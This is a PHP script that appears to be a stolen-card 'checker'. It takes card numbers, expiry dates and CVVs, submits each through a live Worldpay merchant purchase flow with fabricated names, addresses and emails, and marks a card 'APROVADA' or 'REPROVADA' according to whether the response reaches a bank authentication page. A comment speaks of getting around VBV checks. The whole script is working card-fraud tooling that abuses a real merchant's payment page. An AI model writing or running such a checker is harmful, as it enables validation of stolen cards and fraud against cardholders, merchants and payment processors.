# danielzicaxd
<?php

error_reporting(0);


if(file_exists(getcwd().'/bb.txt')) {
        unlink(getcwd().'/bb.txt'); 
    }

	
function value($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end,$str[1]);
	return $str[0];
}



if($_GET['testar']=="cc"){
	$ccs = $_GET['ccs'];
	$separador	= $_GET['separador'];
	$id		= $_GET['id'];
	$explode = explode($separador, $ccs);


if($explode[0][0] == "4"){
		$tipo = "op-DPChoose-VISA^SSL";
	}
	
	elseif($explode[0][0] == "5"){
		$tipo = "op-DPChoose-ECMC^SSL";
	}


	elseif($explode[0][0] == "3"){
	$tipo = "op-DPChoose-AMEX^SSL";
	}

$numero = $explode[0];
$mes = $explode[1];
$ano = $explode[2];
$cvv = $explode[3];



$random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 8)), 0, 8);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase?instId=279852&testMode=0&cartId=1&currency=GBP&amount=1.00");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920F Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_COOKIESESSION, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/bb.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/bb.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 0);       
curl_setopt($ch, CURLOPT_REFERER, '');
//curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$b = curl_exec($ch);
$PaymentID = value($b, 'NAME=PaymentID VALUE="','"');
		
	
curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'Connection: Keep-Alive'
));
curl_setopt($ch, CURLOPT_COOKIESESSION, false);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/bb.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/bb.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 0);       
curl_setopt($ch, CURLOPT_REFERER, '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'PaymentID='.$PaymentID.'&Lang=pt&authCurrency=GBP&'.$tipo.'.x=55&'.$tipo.'.y=17'); //JCB = BURLA O VBV = DE BIN Q VAI PRA TELA DO BANCO AUTHENTICAR
$b12 = curl_exec($ch);


$cardExp_Time = value($b12, 'name="cardExp.time" value="','"');
		

//////////////////////////////////////////////////////////////////////////


curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/card");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded',
'Connection: Keep-Alive'
));
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/bb.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/bb.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 0);       
curl_setopt($ch, CURLOPT_REFERER, '');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'PaymentID='.$PaymentID.'&Lang=pt&cardNoInput='.$numero.'&cardNoJS=&cardNoHidden=*oculto*&cardCVV=&cardExp.day=32&cardExp.time='.$cardExp_Time.'&cardExp.month='.$mes.'&cardExp.year='.$ano.'&name='.$random.'+asdas&address1=asdasd+'.$random.'&address2=&address3=&town=asdasd+'.$random.'&region=&postcode=&country=BR&tel=&fax=&email='.$random.'%40hotmail.com&op-PMMakePayment.x=14&op-PMMakePayment.y=7');
   
  $s = curl_exec($ch);

$valoress = array('R$ 1,00','R$ 3,00','R$ 2,00','R$ 7,00','R$ 10,00','R$ 6,00','R$ 4,00','R$ 5,00');

$debitouu = $valoress[mt_rand(1,9)];

$bin = file_get_contents("http://localhost/full/bin.php?bin=$numero");

if (strpos($s, "https://www66.bb.com.br/SecureCodeAuth") !== false) {
echo "<font color='green' style='font-size: 15px'>APROVADA | $numero | $mes | $ano | $cvv | Informações: $bin</font><br>";

}elseif (strpos($s, "auth.bb") !== false) {
echo "<font color='green' style='font-size: 15px'>APROVADA | $numero | $mes | $ano | $cvv | Informações: $bin</font><br>";

}else{
echo "<font color='red' style='font-size: 15px'>REPROVADA | $numero | $mes | $ano | $cvv | Informações: $bin <br>";
}
   
if(file_exists(getcwd().'/bb.txt')) {
        unlink(getcwd().'/bb.txt'); 
    }

}
 
	
	?>
